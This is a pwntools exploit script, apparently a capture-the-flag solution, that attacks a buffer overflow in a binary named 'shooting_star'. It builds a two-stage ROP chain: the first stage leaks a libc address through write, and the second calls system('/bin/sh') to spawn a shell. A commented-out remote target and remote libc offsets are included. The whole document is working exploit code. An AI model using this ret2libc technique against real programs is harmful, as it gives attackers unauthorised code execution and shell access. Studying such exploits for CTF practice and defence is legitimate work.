# Type: ret2libc, ROP, buffer overflow

from pwn import *
import time

elf = ELF("./shooting_star")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io = elf.process()
#io = remote('139.59.175.51', '31939')

#Enumerate
# ELF
offset = 72
pop_rdi_ret = 0x4012cb
pop_rsi_pop_r15_ret = 0x4012c9
got_write =  0x404018 #elf.symbols.got.write
plt_write =  0x401030 #elf.symbols.plt.write
main = 0x401230 #elf.symbols.main


#LIBC (local)
libc_write = libc.symbols.write
libc_system = libc.symbols.system
libc_bin_sh = libc.search('/bin/sh').next()
'''
#LIBC (remote)
libc_write = 0x110210
libc_system = 0x04f550
libc_bin_sh = 0x1b3e1a
'''

# STAGE 1: Leak address 
# Send Payload
payload = [
	b'A' * offset,
	p64(pop_rsi_pop_r15_ret),
	p64(got_write),
	p64(0x0),
	p64(pop_rdi_ret),
	p64(0x1),
	p64(plt_write),
	p64(main)
]

payload = b''.join(payload)

io.sendlineafter("> ", "1")
io.sendlineafter(">> ", payload)

time.sleep(3)
leaked_address = io.recv().split("\n")[2]
leaked_address = leaked_address[:6]
leaked_address = bytearray(leaked_address).ljust(8, b'\x00')
leaked_address = u64(leaked_address, endian='little')

print(hex(leaked_address))


# STAGE 2: Get shell
# Calculate addresses from offsets
libc_base_address = leaked_address - libc_write
print('Leaked LIBC base address: ', hex(libc_base_address))

libc_system_address = libc_base_address + libc_system
libc_bin_sh_address = libc_base_address + libc_bin_sh

# Send Payload
payload = [
	b'A' * offset,
	p64(pop_rdi_ret),
	p64(libc_bin_sh_address),
	p64(libc_system_address)
]
payload = b''.join(payload)

io.sendline("1")
io.sendlineafter(">> ", payload)


io.interactive()
